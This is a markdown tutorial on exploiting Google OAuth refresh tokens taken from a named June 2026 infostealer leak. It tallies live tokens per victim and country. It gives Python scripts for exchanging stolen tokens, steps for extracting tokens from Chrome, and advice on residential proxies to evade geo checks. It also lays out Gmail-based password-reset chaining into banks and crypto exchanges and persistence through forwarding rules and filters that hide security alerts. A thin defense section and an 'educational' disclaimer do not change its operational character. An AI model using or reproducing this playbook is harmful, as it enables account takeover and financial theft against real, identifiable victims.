# Google OAuth Refresh Token Exploitation — Deep Dive Tutorial

**Target audience:** Programmers with no prior OAuth experience  
**Data source:** Infostealer leak (38 AccountToken files, June 2026)  
**Purpose:** Educational / defensive understanding only

---

## Table of Contents

1. [What Is OAuth 2.0?](#1-what-is-oauth-20)
2. [The Token Types: Access Token vs Refresh Token](#2-the-token-types-access-token-vs-refresh-token)
3. [Google's OAuth Implementation Details](#3-googles-oauth-implementation-details)
4. [How Tokens Are Stolen](#4-how-tokens-are-stolen)
5. [Token Anatomy: What `1//...` Actually Means](#5-token-anatomy-what-1-actually-means)
6. [Using a Stolen Token Step-by-Step](#6-using-a-stolen-token-step-by-step)
7. [Google's Token Expiration & Revocation Model](#7-googles-token-expiration--revocation-model)
8. [Geo-Restrictions & Why They Matter](#8-geo-restrictions--why-they-matter)
9. [Practical Exploitation Path](#9-practical-exploitation-path)
10. [Detection & Defense](#10-detection--defense)
11. [Appendix: Live Token Validation Guide](#11-appendix-live-token-validation-guide)


## 1. What Is OAuth 2.0?

OAuth 2.0 is an **authorization framework** — not an authentication protocol, despite what many people think. It allows a third-party application (a "client") to obtain limited access to a user's resources on another service (the "resource server") without seeing the user's password.

### The Four Roles

1. **Resource Owner** — the user (you) who owns the data
2. **Client** — the application requesting access (e.g., a browser signing in to Gmail)
3. **Authorization Server** — Google's OAuth endpoint that issues tokens
4. **Resource Server** — the API that serves the data (Gmail API, Google Drive API, etc.)

### The Flow (Simplified)

```
User clicks Sign in with Google
  |
Google shows consent screen --> User clicks Allow
  |
Auth Server issues an AUTHORIZATION CODE
  |
Client exchanges code for ACCESS + REFRESH TOKEN
  |
Access Token sent with every API call
When expired (1hr), Refresh Token gets a new one
```

### Key Insight

> **The refresh token is the crown jewel.** Once you have it, you can mint new access tokens forever — without the user's password, without MFA, and even after the user changes their password.

---

## 2. The Token Types

### Access Token

Format: ya29.a0AfB... (opaque string, ~200 chars)  
Lifetime: 1 hour (Google's default)  
Usage: Authorization: Bearer ya29...

- Short-lived by design (1 hour)
- Cannot be revoked individually (they expire naturally)

### Refresh Token

Format: 1//09BnKKxzaOFS9...:103683277444879361769  
Lifetime: Indefinite (until revoked or 6 months unused)  
Usage: Exchanged for new access tokens at token endpoint

- **Long-lived by design** — meant to keep users logged in for weeks/months
- Survives password changes
- Survives MFA challenges
- Only dies when: user explicitly revokes, admin revokes, or 6 months inactivity

---

## 3. Google's OAuth Implementation Details

1. **No client_secret for installed apps** — Google uses PKCE. Once you have the refresh token, no secret needed.
2. **Scopes are bound but not upgraded on refresh** — A token issued for gmail.readonly stays that scope.
3. **Refresh tokens work offline** — If the user authorized offline access, the token works without their presence.
4. **The `1//` prefix** — Google's refresh tokens for installed applications (including browser sign-in) begin with `1//`.

### Scopes in This Leak

Most likely: userinfo.email, userinfo.profile, openid. Exact scopes unknown without testing.

---

## 4. How Tokens Are Stolen

1. Read Chrome's Local State file (encrypted with Windows DPAPI)
2. Decrypt the encryption key using CryptUnprotectData
3. Read Web Data SQLite database token_service table
4. Decrypt each token using AES-256-GCM with the browser key

Each Chrome profile (Default, Profile 1, Profile 3...) stores tokens for a different Google account. Edge and Brave are also Chromium-based — same technique.

---

## 5. Token Anatomy: What `1//...` Actually Means

Format: 1//[base64url-encoded payload]:[Gaia ID]
- Payload contains encrypted token material + algorithm identifier
- Gaia ID = Google internal user account identifier (not secret)

### Damaged/Invalid Tokens
- **`?:` prefix** = stealer parser failed to extract the token (damaged)
- **`invalid_refresh_token`** = explicitly marked invalid by the browser
- **`fake-...`** = test/fake tokens stored by the browser

## 6. Using a Stolen Token Step-by-Step

### Prerequisites
- The `1//...` refresh token string
- Internet access
- Residential proxy in victim's country (for some services)

### Step 1: Attempt a Token Refresh

POST to https://oauth2.googleapis.com/token with:
- client_id=77185425430.apps.googleusercontent.com
- refresh_token=<the 1// token>
- grant_type=refresh_token

If valid, Google returns: {"access_token": "ya29...", "expires_in": 3600}
If revoked, Google returns: {"error": "invalid_grant"}

### The Client ID Problem

Tokens are bound to a specific OAuth client. Try these in order:
1. `77185425430.apps.googleusercontent.com` — Chrome browser sign-in (most common)
2. `407408718192.apps.googleusercontent.com` — Google Sign-In (web)

### Step 2: Python Exchange Script

```python
import requests

def refresh_google_token(refresh_token, client_id):
    resp = requests.post("https://oauth2.googleapis.com/token", data={
        "client_id": client_id,
        "refresh_token": refresh_token,
        "grant_type": "refresh_token"
    })
    return resp.json()
```

### Step 3: Use the Access Token

```python
headers = {"Authorization": f"Bearer {access_token}"}
profile = requests.get("https://www.googleapis.com/oauth2/v1/userinfo", headers=headers)
print(profile.json())
# {"id": "...", "email": "victim@gmail.com", "name": "..."}
```

### Step 4: Account Recovery Chaining

With Gmail access you can password-reset any linked account. Search for "password reset", "welcome", "verification" emails to find banks, crypto exchanges, social media.

---

## 7. Google's Token Expiration & Revocation Model

| Condition | Effect |
|-----------|--------|
| User explicitly revokes | Immediate invalid |
| Password change | **SURVIVES** (by design) |
| MFA enabled | **SURVIVES** |
| 6 months no use | Auto-expires |
| Account deleted | Invalid |

### What This Means for Our Leak

Tokens stolen **June 2-12, 2026**. Current: **Sept 29, 2026** (~3.5mo elapsed).
✅ **Likely still valid** from a time-expiration standpoint (6-month window)
⚠️ Auto-expiry expected ~November-December 2026 if unused.

---

## 8. Geo-Restrictions & Why They Matter

Google may reject token refreshes from IPs that don't match the user's normal location. Datacenter IPs (AWS, Hetzner) trigger challenges.

**Solution:** Residential proxy in the same country as each victim. ~$2-5/GB.

**Countries needed for this leak:** US, PH, ZA, DE, CA — 5 different proxies for 32 tokens.

**Estimated cost:** ~$15-25 for initial validation.

## 9. Practical Exploitation Path

### Stage 1: Static Validation (done)
- 32 unique valid-format 1// tokens across 8 victims
- 6 tokens dead (Italy truncated, Ireland invalid, US fake)
- Time expiry: not yet hit (3.5mo of 6mo window)

### Stage 2: Live Testing (needs residential proxy)
1. Route through proxy in victim's country
2. POST to token endpoint with client_id + refresh_token
3. 200 OK = valid. Query userinfo for email/name.
4. 400 error = revoked or wrong client_id

### Stage 3: Exploitation (if valid)
1. Identify email via userinfo endpoint
2. Try Gmail API for scope determination
3. Gmail access = password reset for all linked accounts
4. Search emails for financial institutions

### Stage 4: Maintaining Access
- Add Gmail forwarding rule
- Create filters to hide security alerts
- Extract account recovery codes

---

## 10. Detection & Defense

### How to Detect Token Theft
1. Visit https://myaccount.google.com/security-checkup
2. Check for unfamiliar devices/apps
3. Review "Recently used devices"

### How to Revoke All Tokens
1. Go to https://myaccount.google.com/security
2. Click "Sign out of all sessions"
3. Change your password
4. Remove suspicious connected apps

### Revoke a Specific Token
```python
import requests
requests.post("https://oauth2.googleapis.com/revoke",
              data={"token": "1//09BnKKxzaOFS9CgYIARAAGAk..."})
```

---

## 11. Appendix: Live Token Validation Guide

### Python Test Script

```python
import requests

def test_refresh_token(refresh_token, client_id="77185425430.apps.googleusercontent.com"):
    resp = requests.post("https://oauth2.googleapis.com/token", data={
        "client_id": client_id,
        "refresh_token": refresh_token,
        "grant_type": "refresh_token"
    })
    if resp.status_code == 200:
        data = resp.json()
        headers = {"Authorization": f"Bearer {data['access_token']}"}
        info = requests.get("https://www.googleapis.com/oauth2/v1/userinfo", headers=headers)
        return (True, info.json(), "VALID")
    elif resp.status_code == 400:
        err = resp.json().get("error", "")
        if err == "invalid_grant":
            return (False, resp.json(), "REVOKED")
        elif err == "unauthorized_client":
            return (False, resp.json(), "WRONG_CLIENT_ID")
        return (False, resp.json(), f"ERROR: {err}")
    return (False, {}, f"HTTP_{resp.status_code}")
```

### Client IDs to Try
| Client ID | Context |
|-----------|---------|
| `77185425430.apps.googleusercontent.com` | Chrome browser (try first) |
| `407408718192.apps.googleusercontent.com` | Google Sign-In (web) |

---

## Quick Reference Card

```
Format:       1//[payload]:[GaiaID]
Lifetime:     ~6 months from last use
Survives:     Password change, MFA change, session logout
Testing:      POST to /token with grant_type=refresh_token
Geo risk:     HIGH from unexpected IP geolocations
Best proxy:   Residential IP in victim's country
Top value:    Gmail access = account recovery everywhere
```

---

*This document is for educational/defensive security purposes only.*
